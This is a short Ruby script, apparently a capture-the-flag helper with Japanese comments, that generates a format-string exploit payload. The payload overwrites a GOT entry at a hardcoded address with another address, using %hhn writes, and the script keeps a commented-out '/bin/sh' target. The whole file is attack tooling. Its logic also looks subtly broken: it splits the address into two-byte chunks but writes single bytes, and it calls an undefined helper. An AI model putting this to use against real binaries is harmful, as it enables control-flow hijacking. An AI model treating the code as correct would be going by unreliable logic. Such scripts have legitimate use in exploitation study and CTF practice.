#!/usr/bin/env ruby
require ENV['DOT_DIR']+'/utils/bcho'

class Integer
  def to_sh
    to_s(16)
  end
end

class String
  def to_ih
    to_i(16)
  end
end

# GOT を上書きするコードを計算して生成する
  # ある程度は自動で取得してもいいかもしれない

origin = 0x0804a018 # 書き換え対象
dest = 0xf7e63e70   # 書き換え後
first_pos = 4         # %4$pで探す
# shell = '/bin/sh'


def split_address(hex)
  hex.to_sh.split(/(.{4})/).reject(&:empty?).map(&:to_ih)
end

dest_parts = split_address(dest)
origin_parts = dest_parts.size.times.map{|i| origin+i*2}

origin_values = origin_parts.map{|hex| '0x'+hex.to_sh}
current_num = origin_parts.size*4

dest_parts.reverse.map{|n| n}
dest_values = dest_parts.reverse.map do |n|
  if n < current_num
    a = 0xffff - current_num%0xffff
    ret = a + n
  else
    ret = n - current_num
  end

  current_num = n
  ret
end.to_a

# bcho_str = 'bcho %s' % origin_values.join(' ')
echo_str = dest_values.map.with_index{|n,i| "%#{n}x%#{first_pos+i}$hhn"}.join

# system(bcho_str)
p origin_values
p origin_values.map{|s| to_little(s.to_i)}
p echo_str
